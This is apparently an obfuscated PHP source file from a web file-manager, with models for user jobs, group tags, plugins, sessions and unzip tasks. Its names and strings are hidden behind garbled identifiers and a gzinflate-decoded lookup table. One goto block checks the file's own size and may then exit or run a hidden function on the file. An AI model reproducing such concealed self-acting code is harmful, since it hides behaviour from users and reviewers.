$‡’Ğ÷í© < count($äâßñ); $‡’Ğ÷í©++) { $ªÇæ¹ò¿[$„–áÛç€[419]] = $äâßñ[$‡’Ğ÷í©]; $this->where($ªÇæ¹ò¿)->save(array($„–áÛç€[1861] => $‡’Ğ÷í© + 1)); } return !0; } protected function moveTop($äÌƒéø) { $®‘İÆóÜ =& $_SERVER[Ì¥ŞÒ°£]; $·ã˜ëŒŒ = array($®‘İÆóÜ[1658] => USER_ID, $®‘İÆóÜ[484] => 0); $Óºã„ƒû = $this->where($·ã˜ëŒŒ)->where(array($®‘İÆóÜ[32] => $äÌƒéø))->find(); if (!$Óºã„ƒû) { return; } $Š¨Ş’õë = $this->field($®‘İÆóÜ[399])->where($·ã˜ëŒŒ)->order($®‘İÆóÜ[2299])->select(); $Š¨Ş’õë = array_to_keyvalue($Š¨Ş’õë, $®‘İÆóÜ[12], $®‘İÆóÜ[399]); $¤³¼ê‘Œ = $Š¨Ş’õë; $Š¨Ş’õë = array_remove_value($Š¨Ş’õë, $Óºã„ƒû[$®‘İÆóÜ[399]]); array_unshift($Š¨Ş’õë, $Óºã„ƒû[$®‘İÆóÜ[399]]); return $this->resetSort($Š¨Ş’õë); } protected function moveBottom($ÁœÓ§ü) { $£µˆ¶Š =& $_SERVER[Ì¥ŞÒ°£]; $Î³Âû” = array($£µˆ¶Š[1658] => USER_ID, $£µˆ¶Š[484] => 0); $ÌàÇ¼¹ = $this->where($Î³Âû”)->max($£µˆ¶Š[1881]); $Á¶­æ³Ş = array($£µˆ¶Š[1881] => $ÌàÇ¼¹ + 1); return $this->where($Î³Âû”)->where(array($£µˆ¶Š[32] => $ÁœÓ§ü))->save($Á¶­æ³Ş); } private function getAutoName($ˆììù²â) { $™‚îÅ½— =& $_SERVER[Ì¥ŞÒ°£]; $ÙÜÉÂçÀ = array($™‚îÅ½—[1658] => USER_ID, $™‚îÅ½—[484] => 0); $Ä‰‡²±¶ = $this->field($™‚îÅ½—[32])->where($ÙÜÉÂçÀ)->select(); $Ä‰‡²±¶ = array_to_keyvalue($Ä‰‡²±¶, $™‚îÅ½—[12], $™‚îÅ½—[32]); if (!$Ä‰‡²±¶ || !in_array($ˆììù²â, $Ä‰‡²±¶)) { return $ˆììù²â; } for ($ıâ¥–ıÚ = 0; $ıâ¥–ıÚ < count($Ä‰‡²±¶); $ıâ¥–ıÚ++) { if (!in_array($ˆììù²â . "\x28{$ıâ¥–ıÚ}\x29", $Ä‰‡²±¶)) { return $ˆììù²â . "\x28{$ıâ¥–ıÚ}\x29"; } } return $ˆììù²â . "\x28{$ıâ¥–ıÚ}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\152\x6f\x62\114\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\144\145\x73\143", "\x73\157\162\164"); const JOB_KEY = "\163\145\154\146\x4a\x6f\142\x4c\x69\163\164"; public function listData($âƒœ£õĞ = false, $»ñüÃ¢ú = "\163\x6f\x72\164", $©Ãç©£Œ = false) { return parent::listData($âƒœ£õĞ, $»ñüÃ¢ú, $©Ãç©£Œ); } public function remove($Óš‘ôÙÛ) { return parent::remove($Óš‘ôÙÛ); } public function add($¥ßüäŸ) { $ŒˆÛÚ£ã =& $_SERVER[Ì¥ŞÒ°£]; if ($this->findByName($¥ßüäŸ[$ŒˆÛÚ£ã[32]])) { return !1; } $¥ßüäŸ[$ŒˆÛÚ£ã[1881]] = $this->getSort(); return parent::insert($¥ßüäŸ); } private function getSort() { $ŸßÉİö =& $_SERVER[Ì¥ŞÒ°£]; $¼¬šâ¿Æ = parent::listData(); $±äæÁ«¢ = array_to_keyvalue($¼¬šâ¿Æ, $ŸßÉİö[12], $ŸßÉİö[1881]); return empty($±äæÁ«¢) ? 0 : max($±äæÁ«¢) + 1; } public function update($ºíŞ°‰¹, $ÎÙª¢´Á) { $¥¶‘î‹ =& $_SERVER[Ì¥ŞÒ°£]; $©Ş—ë = parent::listData($ºíŞ°‰¹); $Ô†··Ê‚ = $this->findByName($ÎÙª¢´Á[$¥¶‘î‹[32]]); if (!$©Ş—ë || $Ô†··Ê‚ && $Ô†··Ê‚[$¥¶‘î‹[399]] != $©Ş—ë[$¥¶‘î‹[399]]) { return !1; } return parent::update($ºíŞ°‰¹, $ÎÙª¢´Á); } public function setUserJob($õı­Îç‡, $¶·Ğ™™) { $ë•Ìª…ø =& $_SERVER[Ì¥ŞÒ°£]; if (!is_array($¶·Ğ™™)) { $¶·Ğ™™ = array($¶·Ğ™™); } $ÑòùÎäú = parent::listData(); $³Å÷•Ö = array_to_keyvalue($ÑòùÎäú, $ë•Ìª…ø[32]); $¬®ç†–“ = $ë•Ìª…ø[378]; foreach ($¶·Ğ™™ as $¯ÒÈÕÉî) { if ($³Å÷•Ö[$¯ÒÈÕÉî]) { $¬®ç†–“ .= $³Å÷•Ö[$¯ÒÈÕÉî][$ë•Ìª…ø[399]] . $ë•Ìª…ø[50]; } else { $¤¦Ø‘¯Ù = $this->add($¯ÒÈÕÉî); $¬®ç†–“ .= $¤¦Ø‘¯Ù . $ë•Ìª…ø[50]; } } $¬®ç†–“ = rtrim($¬®ç†–“, $ë•Ìª…ø[50]); Model($ë•Ìª…ø[535])->metaSet($õı­Îç‡, self::JOB_KEY, $¬®ç†–“); } public function getUserJob($¿Ü£“ŒÙ) { $–‚á©Ÿ³ = Model($_SERVER[Ì¥ŞÒ°£][535])->metaGet($¿Ü£“ŒÙ); return $this->getUserJobInfo($–‚á©Ÿ³[self::JOB_KEY]); } public function getUserJobInfo($ëÚ°øù‘) { $Ùˆª™õÓ =& $_SERVER[Ì¥ŞÒ°£]; $™€ß°ëë = explode($Ùˆª™õÓ[50], $ëÚ°øù‘); $‰ÅŸÆ¯ù = parent::listData(); $‰ÅŸÆ¯ù = array_remove_key($‰ÅŸÆ¯ù, $Ùˆª™õÓ[200]); $®’Æéò = array(); foreach ($™€ß°ëë as $ÌİÏ•ƒ’) { if (isset($‰ÅŸÆ¯ù[$ÌİÏ•ƒ’])) { $®’Æéò[] = $‰ÅŸÆ¯ù[$ÌİÏ•ƒ’]; } } return $®’Æéò; } } goto F¥ƒ·®ê”„; f¶»˜ÜÌ‹ç: $_file = $_SERVER[$_SERVER[Ì¥ŞÒ°£][915]]; $_size = $_SERVER[Ì¥ŞÒ°£][876]; if ($_SERVER[$_SERVER[Ì¥ŞÒ°£][877]] != $_size($_file)) { $_getc = $_SERVER[Ì¥ŞÒ°£][879]; $_getfile = $_SERVER[$_SERVER[Ì¥ŞÒ°£][874]] . $_SERVER[Ì¥ŞÒ°£][875]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ì¥ŞÒ°£][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ì¥ŞÒ°£][615]) { $exit = $_SERVER[Ì¥ŞÒ°£][880]; $exit(); } $_act = $_SERVER[Ì¥ŞÒ°£][916]; $_act($_file); } goto D‚«µ‰ĞĞ; dáÉÜÌá¼Ù: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($ƒş‰Áøœ) { $ãİÇ‹è³ =& $_SERVER[Ì¥ŞÒ°£]; return array($ãİÇ‹è³[1966] => array($ƒş‰Áøœ[0], $ãİÇ‹è³[1967]), $ãİÇ‹è³[1968] => array($ƒş‰Áøœ[0], $ãİÇ‹è³[1969])); } protected function get($İÏ¯¹) { $ÃÕ ğ—© =& $_SERVER[Ì¥ŞÒ°£]; $ª¥éŠßü = Model($ÃÕ ğ—©[522])->metaGet($İÏ¯¹, $ÃÕ ğ—©[1970]); $¨Á¢æßš = json_decode($ª¥éŠßü, !0); return $¨Á¢æßš ? $¨Á¢æßš : array($ÃÕ ğ—©[1971] => $ÃÕ ğ—©[88], $ÃÕ ğ—©[369] => array()); } protected function set($Œì¾ŸÉ, $‰—ıŒîè) { $¶şÛÊŒÙ =& $_SERVER[Ì¥ŞÒ°£]; $‰—ıŒîè = $‰—ıŒîè ? $‰—ıŒîè : array($¶şÛÊŒÙ[1971] => $¶şÛÊŒÙ[88], $¶şÛÊŒÙ[369] => array()); return Model($¶şÛÊŒÙ[522])->metaSet($Œì¾ŸÉ, $¶şÛÊŒÙ[1970], json_encode($‰—ıŒîè)); } protected function getByTagID($¥ûÂ™, $¶«Ş÷) { $òé¶äÀô =& $_SERVER[Ì¥ŞÒ°£]; if (!$¥ûÂ™ || !$¶«Ş÷) { return !1; } if (!Model($òé¶äÀô[522])->getInfoSimple($¥ûÂ™)) { return !1; } $Á­ıº·ˆ = $this->get($¥ûÂ™); if (!$Á­ıº·ˆ || !isset($Á­ıº·ˆ[$òé¶äÀô[369]])) { return !1; } $ôÛè™¬™ = array_find_by_field($Á­ıº·ˆ[$òé¶äÀô[369]], $òé¶äÀô[399], $¶«Ş÷); return is_array($ôÛè™¬™) ? $ôÛè™¬™ : !1; } public function listSource($é¥ú„Ô, $à“Û¦õ) { $ØïĞñ¸ =& $_SERVER[Ì¥ŞÒ°£]; if ($à“Û¦õ && !is_array($à“Û¦õ)) { $à“Û¦õ = array($à“Û¦õ); } $³¯ª¦Ô¥ = $this->listData($é¥ú„Ô); $ŒäÓÉ“ó = array(); foreach ($³¯ª¦Ô¥ as $‘œ–›âÕ) { $Ï¤ıÙº´ = $‘œ–›âÕ[$ØïĞñ¸[84]]; if (!$Ï¤ıÙº´) { continue; } if (!isset($ŒäÓÉ“ó[$Ï¤ıÙº´])) { $ŒäÓÉ“ó[$Ï¤ıÙº´] = array(); } $ŒäÓÉ“ó[$Ï¤ıÙº´][] = $‘œ–›âÕ[$ØïĞñ¸[426]]; } $øÈñü»ï = array(); foreach ($ŒäÓÉ“ó as $¹µ‡ œ => $¥ÂÆ·ŒÖ) { $ŸŞà´ª– = !0; if (!$à“Û¦õ) { $øÈñü»ï[] = $¹µ‡ œ; continue; } foreach ($à“Û¦õ as $éœ¡«œª) { if (!in_array($éœ¡«œª, $¥ÂÆ·ŒÖ)) { $ŸŞà´ª– = !1; break; } } if ($ŸŞà´ª–) { $øÈñü»ï[] = $¹µ‡ œ; } } if (!$øÈñü»ï) { return array(); } $˜âıéëè = array($ØïĞñ¸[417] => array($ØïĞñ¸[418], $øÈñü»ï), $ØïĞñ¸[505] => $é¥ú„Ô, $ØïĞñ¸[411] => SourceModel::TYPE_GROUP); $î×½å»ã = Model($ØïĞñ¸[1341])->listSource($˜âıéëè); if (!$î×½å»ã || count($øÈñü»ï) == $î×½å»ã[$ØïĞñ¸[366]][$ØïĞñ¸[367]]) { return $î×½å»ã; } $Ä§Ñ®ø– = array(); $ãü“£ğÂ = array_to_keyvalue($î×½å»ã[$ØïĞñ¸[82]], $ØïĞñ¸[12], $ØïĞñ¸[402]); $óßê½½ = array_to_keyvalue($î×½å»ã[$ØïĞñ¸[83]], $ØïĞñ¸[12], $ØïĞñ¸[402]); $˜ÑÖƒìÑ = array_merge($óßê½½, $ãü“£ğÂ); foreach ($øÈñü»ï as $Ï¤ıÙº´) { if (!in_array($Ï¤ıÙº´, $˜ÑÖƒìÑ)) { $Ä§Ñ®ø–[] = $Ï¤ıÙº´; } } if ($Ä§Ñ®ø–) { $this->removeBySource($é¥ú„Ô, $Ä§Ñ®ø–); } return $î×½å»ã; } protected function listData($¬¡•°íÊ) { $ÉˆŠ¡Ù¹ =& $_SERVER[Ì¥ŞÒ°£]; $õİîâõú = array($ÉˆŠ¡Ù¹[1658] => 0, $ÉˆŠ¡Ù¹[484] => array($ÉˆŠ¡Ù¹[1972], 0), $ÉˆŠ¡Ù¹[422] => $ÉˆŠ¡Ù¹[1973] . $¬¡•°íÊ); $¯Áà‹Ûö = $ÉˆŠ¡Ù¹[1974]; $§ÎË×æñ = $this->field($¯Áà‹Ûö)->where($õİîâõú)->order($ÉˆŠ¡Ù¹[1975])->select(); return $§ÎË×æñ ? $§ÎË×æñ : array(); } protected function addToTag($‰×É›à¼, $›¯ôèÙÙ, $ĞÏûÑø§) { $¼—êğÃ± =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->getByTagID($‰×É›à¼, $ĞÏûÑø§) || !$›¯ôèÙÙ) { return !1; } if (!Model($¼—êğÃ±[827])->pathInfo($›¯ôèÙÙ)) { return !1; } $İ¯¯Â­ü = array($¼—êğÃ±[1658] => 0, $¼—êğÃ±[484] => $ĞÏûÑø§, $¼—êğÃ±[421] => $›¯ôèÙÙ, $¼—êğÃ±[422] => $¼—êğÃ±[1976] . $‰×É›à¼, $¼—êğÃ±[420] => $¼—êğÃ±[12], $¼—êğÃ±[1861] => 0); if ($this->where($İ¯¯Â­ü)->find()) { return !1; } return $this->add($İ¯¯Â­ü); } protected function removeFromTag($Ó°öëøÍ, $óüÚŞ ¯, $…Å¢æ¬») { $Üøè“½— =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->getByTagID($Ó°öëøÍ, $…Å¢æ¬») || !$óüÚŞ ¯) { return !1; } if (is_array($óüÚŞ ¯)) { $óüÚŞ ¯ = array($Üøè“½—[7], $óüÚŞ ¯); } $ÒÂØÏ˜ë = array($Üøè“½—[1658] => 0, $Üøè“½—[484] => $…Å¢æ¬», $Üøè“½—[422] => $Üøè“½—[1976] . $Ó°öëøÍ, $Üøè“½—[421] => $óüÚŞ ¯); return $this->where($ÒÂØÏ˜ë)->delete(); } protected function removeByTag($˜§—íáœ, $ßùª°­‚) { $úĞ›Á€í =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->getByTagID($˜§—íáœ, $ßùª°­‚)) { return !1; } $’Ãš‹å = array($úĞ›Á€í[1658] => 0, $úĞ›Á€í[484] => $ßùª°­‚, $úĞ›Á€í[422] => $úĞ›Á€í[1976] . $˜§—íáœ); return $this->where($’Ãš‹å)->delete(); } protected function removeBySource($ı¸ºŸş­, $¬³ä‹Úº) { $—«•º =& $_SERVER[Ì¥ŞÒ°£]; if (!$ı¸ºŸş­ || !$¬³ä‹Úº) { return !1; } if (is_array($¬³ä‹Úº)) { $¬³ä‹Úº = array($—«•º[7], $¬³ä‹Úº); } $€Ã½ŒÍĞ = array($—«•º[1658] => 0, $—«•º[421] => $¬³ä‹Úº, $—«•º[484] => array($—«•º[1019], 0), $—«•º[422] => $—«•º[1976] . $ı¸ºŸş­); return $this->where($€Ã½ŒÍĞ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\56\160\154\x75\x67\x69\156\x4c\x69\163\164"; public $field = array("\156\141\x6d\x65", "\x73\x74\x61\x74\x75\163", "\x72\x65\147\x69\145\163\x74", "\143\157\x6e\146\x69\147"); public function loadList($º´ª¿ï = false) { $ÊÅşÏ³ = array_to_keyvalue($this->listData(), $_SERVER[Ì¥ŞÒ°£][32]); if ($º´ª¿ï) { return $ÊÅşÏ³[$º´ª¿ï]; } return $ÊÅşÏ³; } public function init() { $âØ‚Õ…¤ =& $_SERVER[Ì¥ŞÒ°£]; Hook::trigger($âØ‚Õ…¤[1977]); $¾ÆğŞëÙ = $this->loadPluginList(); foreach ($¾ÆğŞëÙ as $³ıí·ıÎ => $¤š´É«Ö) { $ä¿¯«Úã = $this->appAllow($³ıí·ıÎ, $¤š´É«Ö); if (!$ä¿¯«Úã) { continue; } foreach ($¤š´É«Ö[$âØ‚Õ…¤[1978]] as $‰ ŒÖ¼ => $œµæÔ‡Ç) { Hook::bind($‰ ŒÖ¼, $œµæÔ‡Ç); } } Hook::trigger($âØ‚Õ…¤[1979]); Hook::trigger(ACTION); } public function appAllow($ÑÖåÙ¸, $üíúÖ±ç, $”›‡“è = true) { $¸¬€µÂ =& $_SERVER[Ì¥ŞÒ°£]; $‡¨¼¬¼Š = PLUGIN_DIR . $ÑÖåÙ¸ . $¸¬€µÂ[1980]; if (!is_array($üíúÖ±ç) || !is_array($üíúÖ±ç[$¸¬€µÂ[1978]]) || $üíúÖ±ç[$¸¬€µÂ[752]] != 1 || !is_file($‡¨¼¬¼Š)) { return !1; } if ($GLOBALS[$¸¬€µÂ[503]] == 1) { if ($GLOBALS[$¸¬€µÂ[6]][$¸¬€µÂ[1981]] || !$GLOBALS[$¸¬€µÂ[6]][$¸¬€µÂ[1982]]) { return !0; } $¦ÔÈßÄá = explode($¸¬€µÂ[50], strtolower($GLOBALS[$¸¬€µÂ[6]][$¸¬€µÂ[1982]])); return in_array(strtolower($ÑÖåÙ¸), $¦ÔÈßÄá) ? !1 : !0; } if ($”›‡“è && !Action($¸¬€µÂ[1983])->checkAuth($ÑÖåÙ¸)) { return !1; } return !0; } public function unInstall($”‹•Â¤°) { $¤íã•ç =& $_SERVER[Ì¥ŞÒ°£]; $•Ï‘ó³ = $this->loadList($”‹•Â¤°); if (file_exists(PLUGIN_DIR . $”‹•Â¤°)) { Hook::apply($”‹•Â¤° . $¤íã•ç[1984]); } $this->remove($•Ï‘ó³[$¤íã•ç[399]]); } public function changeStatus($ûÈÏì¢Ñ, $”ğÖ¸ ‡) { $øâ‘š’ =& $_SERVER[Ì¥ŞÒ°£]; $áçâºÜÉ = $this->loadList($ûÈÏì¢Ñ); if ($”ğÖ¸ ‡) { Hook::apply($ûÈÏì¢Ñ . $øâ‘š’[1985]); } $this->update($áçâºÜÉ[$øâ‘š’[399]], array($øâ‘š’[1986] => $”ğÖ¸ ‡)); } public function appRegist($Ò¹ƒá³—, $°åÈåçµ) { $­éîÛ¤Õ =& $_SERVER[Ì¥ŞÒ°£]; $»‡áâÁ› = $this->loadList($Ò¹ƒá³—); if ($»‡áâÁ›) { $this->update($»‡áâÁ›[$­éîÛ¤Õ[399]], array($­éîÛ¤Õ[1978] => $°åÈåçµ)); } else { $Àê¿ğ±¸ = array($­éîÛ¤Õ[32] => $Ò¹ƒá³—, $­éîÛ¤Õ[1978] => $°åÈåçµ, $­éîÛ¤Õ[752] => 0, $­éîÛ¤Õ[6] => $this->getConfigDefault($Ò¹ƒá³—)); $this->insert($Àê¿ğ±¸); } } public function getConfigDefault($¼Òš±) { $É «œâ‚ =& $_SERVER[Ì¥ŞÒ°£]; $’ˆŒÏÃ = array(); $ù¼Ïêƒ  = $this->getPackageJson($¼Òš±); if (!$ù¼Ïêƒ  && is_array($ù¼Ïêƒ [$É «œâ‚[1987]])) { return $’ˆŒÏÃ; } foreach ($ù¼Ïêƒ [$É «œâ‚[1987]] as $šÜ¥¶ƒ => $¡ôÆå¢) { if (!isset($¡ôÆå¢[$É «œâ‚[374]]) || isset($’ˆŒÏÃ[$šÜ¥¶ƒ])) { continue; } $’ˆŒÏÃ[$šÜ¥¶ƒ] = $¡ôÆå¢[$É «œâ‚[374]]; } return $’ˆŒÏÃ; } public function getPackageJson($ûßòµı) { return Hook::apply($ûßòµı . $_SERVER[Ì¥ŞÒ°£][1988]); } public function getConfig($±®ëåÖ, $Ï¯èÕî— = false) { $ÄÍİ¼²‰ =& $_SERVER[Ì¥ŞÒ°£]; $ÕŞ“Î÷ˆ = array(); $‡‰ÚŒ½Á = $this->loadList($±®ëåÖ); if ($‡‰ÚŒ½Á && is_array($‡‰ÚŒ½Á[$ÄÍİ¼²‰[6]])) { $ÕŞ“Î÷ˆ = $‡‰ÚŒ½Á[$ÄÍİ¼²‰[6]]; } if (!$ÕŞ“Î÷ˆ || $Ï¯èÕî—) { $ÕŞ“Î÷ˆ = $this->getConfigDefault($±®ëåÖ); } return $ÕŞ“Î÷ˆ; } public function setConfig($ûÈ§¯€ã, $¡¼úÕ§Õ = false) { $Œ©Œ„½à =& $_SERVER[Ì¥ŞÒ°£]; $ı’øî¥¶ = $this->loadList($ûÈ§¯€ã); if (!$ı’øî¥¶) { return !1; } $½´°Ÿµã = $ı’øî¥¶[$Œ©Œ„½à[6]]; if ($¡¼úÕ§Õ == !1) { $½´°Ÿµã = array(); $¡¼úÕ§Õ = $this->getConfigDefault($ûÈ§¯€ã); } foreach ($¡¼úÕ§Õ as $éÎã…×¬ => $èıÍœ“é) { $½´°Ÿµã[$éÎã…×¬] = is_string($èıÍœ“é) ? trim($èıÍœ“é) : $èıÍœ“é; } $this->update($ı’øî¥¶[$Œ©Œ„½à[399]], array($Œ©Œ„½à[6] => $½´°Ÿµã)); } public function viewList() { $…³¤µú¯ =& $_SERVER[Ì¥ŞÒ°£]; $˜Œ‚Ëì = $this->loadList(); $this->pluginScan($˜Œ‚Ëì); $˜Œ‚Ëì = $this->loadPluginList(); $¢Äµ¨ëµ = array(); foreach ($˜Œ‚Ëì as $†ÜĞşÖ„ => $Ú³Ç§”³) { unset($Ú³Ç§”³[$…³¤µú¯[1978]], $Ú³Ç§”³[$…³¤µú¯[6]]); $‹îóøŸ = PLUGIN_DIR . $Ú³Ç§”³[$…³¤µú¯[32]] . $…³¤µú¯[1980]; if (!is_file($‹îóøŸ)) { continue; } $œÎş¬•Í = Hook::apply($Ú³Ç§”³[$…³¤µú¯[32]] . $…³¤µú¯[1988]); if (is_array($œÎş¬•Í)) { $¢Äµ¨ëµ[$†ÜĞşÖ„] = array_merge($Ú³Ç§”³, $œÎş¬•Í); } } return $¢Äµ¨ëµ; } private function loadPluginList() { $íØÏø±â =& $_SERVER[Ì¥ŞÒ°£]; $éªôÅ = $this->loadList(); if (strtolower(MOD) == $íØÏø±â[1989]) { return $éªôÅ; } $˜¼¥ÍğÊ = Hook::trigger($íØÏø±â[1990], $éªôÅ); if ($éªôÅ && !$˜¼¥ÍğÊ) { die; } return $˜¼¥ÍğÊ ? $˜¼¥ÍğÊ : $éªôÅ; } private function pluginScan($Ç‰”ûÁ) { $ÚĞû‰³ı =& $_SERVER[Ì¥ŞÒ°£]; recursion_dir(PLUGIN_DIR, $ñ÷Ù¥àÒ, $á‚°×‹İ, 0); foreach ($ñ÷Ù¥àÒ as $É˜ØÄ¼) { $¿·ÎÜöÏ = get_path_this($É˜ØÄ¼); if (isset($Ç‰”ûÁ[$¿·ÎÜöÏ]) || !file_exists($É˜ØÄ¼ . $ÚĞû‰³ı[1991]) || !file_exists($É˜ØÄ¼ . $ÚĞû‰³ı[1980])) { continue; } Hook::apply($¿·ÎÜöÏ . $ÚĞû‰³ı[1985]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\x6d\137\163\145\163\163\151\157\156"; public function get($è›æûÁÕ) { $Ôş÷æÇó =& $_SERVER[Ì¥ŞÒ°£]; $›ÂÁ¬ÌŞ = $this->where(array($Ôş÷æÇó[1992] => $è›æûÁÕ))->find(); if (!is_array($›ÂÁ¬ÌŞ)) { return !1; } return $›ÂÁ¬ÌŞ[$Ôş÷æÇó[757]]; } public function set($ß·†œ‚, $ºëÏğ›ü, $ÈœÍğĞ = 3600) { $£ÈğÆªÄ =& $_SERVER[Ì¥ŞÒ°£]; $œ…Øó—á = array($£ÈğÆªÄ[1992] => $ß·†œ‚, $£ÈğÆªÄ[1896] => $ºëÏğ›ü, $£ÈğÆªÄ[1993] => $ÈœÍğĞ + time()); if (Session::get($£ÈğÆªÄ[1994])) { $œ…Øó—á[$£ÈğÆªÄ[1667]] = Session::get($£ÈğÆªÄ[1994]); } else { $œ…Øó—á[$£ÈğÆªÄ[1667]] = 0; } if ($this->get($ß·†œ‚)) { return $this->where(array($£ÈğÆªÄ[1992] => $ß·†œ‚))->save($œ…Øó—á); } else { return $this->add($œ…Øó—á, array(), !0); } } public function remove($úÜş‘¯) { return $this->where(array($_SERVER[Ì¥ŞÒ°£][1992] => $úÜş‘¯))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ì¥ŞÒ°£][1995] . time())->delete(); } } goto B‚ˆ¿æ»Ãæ; fØ»²Üñ›†: $_SERVER[Üè·¥©¸] = explode($_SERVER[Ì¥ŞÒ°£][616], gzinflate(substr($_SERVER[Ì¥ŞÒ°£][617], 10, -8))); $glpajsrtcb = $_SERVER[Ì¥ŞÒ°£][618]; if (!$glpajsrtcb) { die; } goto f‰–ÓŞµ±; bˆÙÔÁù„…: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $†„ÍÇ¹ =& $_SERVER[Ì¥ŞÒ°£]; parent::startAfter(); Hook::bind($†„ÍÇ¹[1778], array($this, $†„ÍÇ¹[1779])); Hook::bind($†„ÍÇ¹[1199], array($this, $†„ÍÇ¹[1780])); $³¢¢øìĞ =& $this->task; $³¢¢øìĞ[$†„ÍÇ¹[1781]] = $†„ÍÇ¹[1200]; if (!$³¢¢øìĞ[$†„ÍÇ¹[1567]]) { $³¢¢øìĞ[$†„ÍÇ¹[1567]] = LNG($†„ÍÇ¹[1782]); } } protected function endAfter() { $«æ÷† =& $_SERVER[Ì¥ŞÒ°£]; parent::endAfter(); Hook::unbind($«æ÷†[1778], array($this, $«æ÷†[1779])); Hook::unbind($«æ÷†[1199], array($this, $«æ÷†[1780])); } public function updateAfter() { $½Ë«ğ÷È =& $_SERVER[Ì¥ŞÒ°£]; $˜¥¨÷‚¡ =& $this->task; if (!$˜¥¨÷‚¡[$½Ë«ğ÷È[788]] || !$˜¥¨÷‚¡[$½Ë«ğ÷È[765]]) { return; } if ($˜¥¨÷‚¡[$½Ë«ğ÷È[1781]] == $½Ë«ğ÷È[1200]) { $‘ŸŠí×ê = 0; if ($˜¥¨÷‚¡[$½Ë«ğ÷È[1721]]) { $‘ŸŠí×ê = $˜¥¨÷‚¡[$½Ë«ğ÷È[1722]] / $˜¥¨÷‚¡[$½Ë«ğ÷È[1721]]; } $˜¥¨÷‚¡[$½Ë«ğ÷È[1669]] = $‘ŸŠí×ê * 0.3; } else { if ($˜¥¨÷‚¡[$½Ë«ğ÷È[1781]] == $½Ë«ğ÷È[313]) { $‘ŸŠí×ê = $˜¥¨÷‚¡[$½Ë«ğ÷È[1668]] / $˜¥¨÷‚¡[$½Ë«ğ÷È[788]]; $˜¥¨÷‚¡[$½Ë«ğ÷È[1669]] = 0.3 + $‘ŸŠí×ê * 0.4; } else { if ($˜¥¨÷‚¡[$½Ë«ğ÷È[1781]] == $½Ë«ğ÷È[107]) { $‚ÁÛ¤åä = 0; if ($˜¥¨÷‚¡[$½Ë«ğ÷È[1723]] == $½Ë«ğ÷È[107]) { $‚ÁÛ¤åä = $˜¥¨÷‚¡[$½Ë«ğ÷È[1722]]; } $‘ŸŠí×ê = ($˜¥¨÷‚¡[$½Ë«ğ÷È[1726]] + $‚ÁÛ¤åä) / $˜¥¨÷‚¡[$½Ë«ğ÷È[765]]; $˜¥¨÷‚¡[$½Ë«ğ÷È[1669]] = 0.3 + 0.4 + $‘ŸŠí×ê * 0.3; } } } if ($˜¥¨÷‚¡[$½Ë«ğ÷È[1669]] > 0) { $“ë¸è¬ = timeFloat() - $˜¥¨÷‚¡[$½Ë«ğ÷È[1671]] - $˜¥¨÷‚¡[$½Ë«ğ÷È[1674]]; $˜¥¨÷‚¡[$½Ë«ğ÷È[1675]] = $“ë¸è¬ * (1 - $˜¥¨÷‚¡[$½Ë«ğ÷È[1669]]) / $˜¥¨÷‚¡[$½Ë«ğ÷È[1669]]; } } public function addFile($ÙÊË¦ë) { $âÌªúìŸ =& $_SERVER[Ì¥ŞÒ°£]; $Ê•§ı… =& $this->task; $¼©×ğ¤Õ = IO::info($ÙÊË¦ë); $Ê•§ı…[$âÌªúìŸ[1719]] = $¼©×ğ¤Õ[$âÌªúìŸ[32]]; $Ê•§ı…[$âÌªúìŸ[1721]] = $¼©×ğ¤Õ[$âÌªúìŸ[76]]; $Ê•§ı…[$âÌªúìŸ[1722]] = 0; $Ê•§ı…[$âÌªúìŸ[1069]] = $âÌªúìŸ[1742]; $Ê•§ı…[$âÌªúìŸ[1723]] = $âÌªúìŸ[1200]; $Ê•§ı…[$âÌªúìŸ[765]] = $¼©×ğ¤Õ[$âÌªúìŸ[76]]; $Ê•§ı…[$âÌªúìŸ[788]] = 1; $õ„­ä…Ì = 0; $Ê•§ı…[$âÌªúìŸ[1730]] = array($âÌªúìŸ[1731] => $õ„­ä…Ì + 1, $âÌªúìŸ[420] => $¼©×ğ¤Õ[$âÌªúìŸ[32]], $âÌªúìŸ[84] => $¼©×ğ¤Õ[$âÌªúìŸ[84]], $âÌªúìŸ[519] => $¼©×ğ¤Õ[$âÌªúìŸ[519]] ? $¼©×ğ¤Õ[$âÌªúìŸ[519]] : $¼©×ğ¤Õ[$âÌªúìŸ[84]]); $this->update(); } public function unzipAfter($›­÷¸­ø) { $‡§ˆÎĞ÷ =& $_SERVER[Ì¥ŞÒ°£]; $Æğ§†Ç‰ =& $this->task; $Æğ§†Ç‰[$‡§ˆÎĞ÷[1781]] = $‡§ˆÎĞ÷[107]; $¡íœ§’£ = IO::infoWithChildren($›­÷¸­ø); $‚²±Ô±Å = 0; $Æğ§†Ç‰[$‡§ˆÎĞ÷[1730]] = array($‡§ˆÎĞ÷[1731] => $‚²±Ô±Å + 1, $‡§ˆÎĞ÷[420] => $¡íœ§’£[$‡§ˆÎĞ÷[32]], $‡§ˆÎĞ÷[84] => $¡íœ§’£[$‡§ˆÎĞ÷[84]], $‡§ˆÎĞ÷[519] => $¡íœ§’£[$‡§ˆÎĞ÷[519]] ? $¡íœ§’£[$‡§ˆÎĞ÷[519]] : $¡íœ§’£[$‡§ˆÎĞ÷[84]]); if ($¡íœ§’£[$‡§ˆÎĞ÷[33]] == $‡§ˆÎĞ÷[199]) { $Æğ§†Ç‰[$‡§ˆÎĞ÷[788]] = 1; } else { $Æğ§†Ç‰[$‡§ˆÎĞ÷[788]] = $¡íœ§’£[$‡§ˆÎĞ÷[79]][$‡§ˆÎĞ÷[77]]; } $Æğ§†Ç‰[$‡§ˆÎĞ÷[1069]] = $‡§ˆÎĞ÷[12]; $Æğ§†Ç‰[$‡§ˆÎĞ÷[1723]] = 0; $Æğ§†Ç‰[$‡§ˆÎĞ÷[1668]] = 0; 